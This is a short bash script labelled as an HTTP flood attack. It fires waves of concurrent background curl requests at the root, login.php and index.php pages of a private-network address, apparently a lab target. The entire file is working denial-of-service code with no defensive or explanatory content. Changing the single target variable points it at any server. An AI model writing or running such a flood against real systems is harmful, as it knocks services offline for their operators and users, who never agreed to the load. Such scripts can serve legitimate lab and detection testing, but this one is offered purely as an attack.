#!/bin/bash

# HTTP Flood Attack Script
TARGET="http://172.20.0.20"

echo "Starting HTTP Flood attack on $TARGET"
echo "Sending multiple concurrent HTTP requests..."

# Function to send HTTP requests
send_requests() {
    for i in {1..50}; do
        curl -s $TARGET > /dev/null &
        curl -s $TARGET/login.php > /dev/null &
        curl -s $TARGET/index.php > /dev/null &
    done
    wait
}

# Send multiple waves of requests
for wave in {1..10}; do
    echo "Wave $wave of HTTP requests..."
    send_requests
    sleep 1
done

echo "HTTP Flood attack completed"
